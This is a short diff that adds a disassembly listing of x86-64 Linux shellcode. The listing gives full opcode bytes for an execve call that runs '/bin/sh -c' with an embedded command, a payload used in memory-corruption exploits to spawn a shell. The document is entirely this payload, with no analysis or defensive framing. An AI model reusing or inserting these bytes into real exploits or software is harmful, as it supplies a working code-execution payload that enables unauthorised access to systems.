@@ -1,0 +1,17 @@
+00000000  6A3B              push byte +0x3b
+00000002  58                pop rax
+00000003  99                cdq
+00000004  48BB2F62696E2F73  mov rbx,0x68732f6e69622f
+         -6800
+0000000E  53                push rbx
+0000000F  4889E7            mov rdi,rsp
+00000012  682D630000        push qword 0x632d
+00000017  4889E6            mov rsi,rsp
+0000001A  52                push rdx
+0000001B  E808000000        call 0x28
+00000020  2F                db 0x2f
+00000021  62                db 0x62
+00000022  696E2F73680056    imul ebp,[rsi+0x2f],dword 0x56006873
+00000029  57                push rdi
+0000002A  4889E6            mov rsi,rsp
+0000002D  0F05              syscall
